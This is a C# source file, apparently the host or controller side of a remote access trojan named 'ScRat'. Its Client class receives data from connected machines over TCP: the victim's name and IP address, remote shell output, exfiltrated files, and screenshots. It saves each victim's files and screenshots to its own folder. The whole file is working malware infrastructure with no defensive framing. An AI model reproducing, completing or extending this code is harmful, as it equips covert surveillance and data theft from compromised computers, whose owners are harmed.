using System;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ScRatHost.net
{
    class Client
    {
        public TcpClient socket;
        public NetworkStream stream;
        public string name = "";
        public string ip = "";

        public Client(TcpClient socket)
        {
            this.socket = socket;
            this.stream = socket.GetStream();
            this.name = socket.Client.RemoteEndPoint.ToString();
        }
        public Packet getPacket()
        {
            try
            {
                byte[] buffer;
                byte[] countBuffer = new byte[4];
                while (this.socket.Available < 0)
                {
                    if ((this.socket.Client.Poll(1000, SelectMode.SelectRead) && (this.socket.Available == 0)) || !this.socket.Connected)
                        return new Packet(PacketType.Exit, new byte[1] { 0 });
                }
                stream.Read(countBuffer, 0, 4);
                int count = BitConverter.ToInt32(countBuffer, 0);
                buffer = new byte[count];

                while (this.socket.Available < count)
                {
                    if ((this.socket.Client.Poll(1000, SelectMode.SelectRead) && (this.socket.Available == 0)) || !this.socket.Connected)
                        return new Packet(PacketType.Exit, new byte[1] { 0 });
                }
                stream.Read(buffer, 0, count);

                return new Packet(buffer);
            }
            catch (Exception e)
            {
                //Console.WriteLine(e.ToString());
                return null;
            }
        }
        public void sendPacket(Packet packet)
        {
            byte[] data = packet.ToBytes();
            try
            {
                stream.Write(BitConverter.GetBytes(data.Length), 0, 4);
                stream.Write(data, 0, data.Length);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
        public void ConsoleWriteLine(string s)
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine(this.name + ":");
            Console.ResetColor();
            Console.WriteLine(s);
        }
        public void run()
        {
            try
            {
                sendPacket(new Packet(PacketType.User, new byte[0] { }));
                byte[] fileFileBuffer = new byte[0];
                string fileFileName = String.Empty;
                int fileFileIndex = 0;

                byte[] screenshotFileBuffer = new byte[0];
                int screenshotFileIndex = 0;

                while (this.socket.Connected)
                {
                    Packet packet = getPacket();
                    if (packet == null) continue;
                    if (packet.type == PacketType.User)
                    {
                        string[] values = Encoding.ASCII.GetString(packet.data).Split(new string[1] { "||SpRatoR||" }, 2, StringSplitOptions.None);
                        this.name = values[0];
                        this.ip = values[1];
                    }
                    else if (packet.type == PacketType.Shell)
                    {
                        ConsoleWriteLine(Encoding.ASCII.GetString(packet.data));
                    }
                    else if (packet.type == PacketType.Download)
                    {
                        if (packet.data[0] == 0)
                        {
                            fileFileBuffer = new byte[BitConverter.ToInt32(packet.data, 1)];
                            fileFileIndex = 0;
                            byte[] nameBytes = new byte[packet.data[5]];
                            Array.Copy(packet.data, 6, nameBytes, 0, packet.data[5]);
                            fileFileName = Encoding.ASCII.GetString(nameBytes);
                            ConsoleWriteLine("File: " + fileFileName + " Size: " + String.Format("{0:n0}", fileFileBuffer.Length) + " bytes");
                        }
                        else if (packet.data[0] == 1)
                        {
                            Array.Copy(packet.data, 1, fileFileBuffer, fileFileIndex, packet.data.Length - 1);
                            fileFileIndex += packet.data.Length - 1;
                            Console.SetCursorPosition(0, Console.CursorTop);
                            Console.Write("Downloading: " + ((fileFileIndex * 100) / fileFileBuffer.Length).ToString() + "%");
                        }
                        else if (packet.data[0] == 2)
                        {
                            Helper.writeFile(Directory.GetCurrentDirectory() + "/" + this.name + "/" + fileFileName, fileFileBuffer);
                            Console.WriteLine();
                            ConsoleWriteLine("Successfully downloaded " + fileFileName);
                            fileFileBuffer = new byte[0] { };
                        }
                        else
                        {
                            Console.WriteLine("ERRROR!");
                        }
                    }
                    else if (packet.type == PacketType.Error)
                    {
                        ConsoleWriteLine("Error: " + Encoding.ASCII.GetString(packet.data));
                    }
                    else if (packet.type == PacketType.Screenshot)
                    {
                        if (packet.data[0] == 0)
                        {
                            screenshotFileBuffer = new byte[BitConverter.ToInt32(packet.data, 1)];
                            screenshotFileIndex = 0;
                        }
                        else if (packet.data[0] == 1)
                        {
                            Array.Copy(packet.data, 1, screenshotFileBuffer, screenshotFileIndex, packet.data.Length - 1);
                            screenshotFileIndex += packet.data.Length - 1;
                            Console.SetCursorPosition(0, Console.CursorTop);
                            Console.Write("Downloading screenshot: " + ((screenshotFileIndex * 100) / screenshotFileBuffer.Length).ToString() + "%");
                        }
                        else if (packet.data[0] == 2)
                        {
                            string fileName = String.Format("{0:MMM-d-yyy HH-mm-ss}", DateTime.Now) + ".png";
                            Helper.writeFile(Directory.GetCurrentDirectory() + "/" + this.name + "/screenshots/" + fileName, screenshotFileBuffer);
                            Console.WriteLine();
                            ConsoleWriteLine("Successfully downloaded screenshot: " + fileName);
                            screenshotFileBuffer = new byte[0] { };
                        }
                        else
                        {
                            Console.WriteLine("ERRROR!");
                        }
                    }
                    else if (packet.type == PacketType.Exit)
                    {
                        socket.Close();
                    }
                    else
                    {
                        ConsoleWriteLine("Wacky packet recived");
                    }
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.ToString());
            }
        }
    }
}
